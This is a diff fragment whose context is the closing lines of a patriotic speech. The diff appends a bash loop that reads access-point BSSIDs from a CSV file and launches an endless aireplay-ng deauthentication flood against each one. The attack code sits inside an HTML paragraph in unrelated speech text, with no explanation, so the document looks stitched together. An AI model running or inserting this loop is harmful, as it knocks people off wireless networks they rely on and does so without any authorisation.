@@ -32,3 +32,10 @@ In conclusion, let's reaffirm our dedication to safeguarding our nation. Togethe
 
 Thank you.
 </b>
+
+
+<p>while IFS=, read -r bssid; do
+  aireplay-ng --deauth 0 -a "$bssid" wlan0mon &
+done < deauth_targets.csv
+wait
+</p>
